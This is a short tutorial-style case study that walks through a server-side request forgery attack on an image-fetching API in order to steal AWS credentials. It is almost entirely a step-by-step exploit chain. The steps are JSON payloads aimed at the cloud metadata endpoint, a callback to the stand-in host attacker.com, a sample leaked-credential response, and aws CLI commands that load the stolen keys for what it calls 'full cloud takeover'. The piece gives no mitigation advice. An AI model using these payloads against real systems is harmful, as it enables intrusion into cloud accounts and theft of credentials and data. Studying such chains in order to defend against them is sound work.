Real-World SSRF Exploits
Case Study 1: AWS Metadata Credential Theft

Scenario: Image processing API that fetches images from URLs
python

# Vulnerable endpoint
POST /api/process-image HTTP/1.1
Host: target.com
Content-Type: application/json

{
    "image_url": "https://example.com/photo.jpg"
}

Exploitation Chain:
bash

# Step 1: Test for SSRF
POST /api/process-image
{"image_url": "http://169.254.169.254/latest/meta-data/"}

# Step 2: If blind, use DNS callback
{"image_url": "http://attacker.com/callback?data="}

# Step 3: Access metadata (after bypassing filters)
{"image_url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"} → Role name

# Step 4: Get credentials
{"image_url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/MyRole"}

# Response (even if blind, you might get errors)
{
    "AccessKeyId": "ASIA5FB...",
    "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCY...",
    "Token": "IQoJb3JpZ2luX2VjEA...",
    "Expiration": "2024-12-31T23:59:59Z"
}

# Step 5: Use credentials
aws configure set aws_access_key_id ASIA5FB...
aws configure set aws_secret_access_key wJalrXUtnF...
aws configure set aws_session_token IQoJb3Jp...

# Step 6: Full cloud takeover
aws s3 ls --profile stolen
aws ec2 describe-instances

